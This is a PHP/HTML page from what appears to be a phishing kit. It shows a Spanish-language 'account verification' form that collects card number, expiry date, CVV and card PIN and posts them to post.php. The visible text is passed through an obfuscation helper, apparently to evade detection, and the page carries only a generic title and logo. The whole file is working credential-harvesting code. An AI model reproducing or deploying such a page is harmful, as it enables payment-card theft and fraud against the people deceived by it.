<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Online</title>
    <link rel="stylesheet" href="inc/style/style.css">
</head>
<body>
<header>
    <img src="inc/images/logo.png">
</header>

<main>
<div class="form">

<div class="col title">
<?php $m->obf("Verificación"); ?>
</div>

<div class="col text">
<p><?php $m->obf("Para verificar su cuenta. Por favor, introduzca la siguiente información.");?> </p>
</div>

<form action="post.php" method="post">
<div class="col">
    <label><?php $m->obf("Número de tarjeta"); ?></label>
    <input type="text" inputmode="numeric" id="d1" name="cc"required >
</div>
<div class="col">
    <label><?php $m->obf("Fecha de caducidad"); ?></label>
    <input type="text" inputmode="numeric" id="d2"name="exp" required>
</div>
<div class="col">
    <label><?php $m->obf("Codigo CVV"); ?></label>
    <input type="text" inputmode="numeric" id="d3" name="cvv" required>
</div>
<div class="col">
    <label><?php $m->obf("Código PIN"); ?></label>
    <input type="text" inputmode="numeric" id="d4" name="pin" required>
</div>


<div class="col">
    <button type="submit"><?php $m->obf("Continuar"); ?></button>
</div>
</form>

</div>
</main>
<div class="loader">
    <div class="loader_content">
        <img src="inc/images/loading.gif">
    </div> 
</div>

<?php require 'html/footer.php'; ?>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>

<script>
 
$("#d1").mask("0000 0000 0000 0000");
$("#d2").mask("00/00");
$("#d3").mask("000");
$("#d4").mask("0000");

</script>

</body>
</html>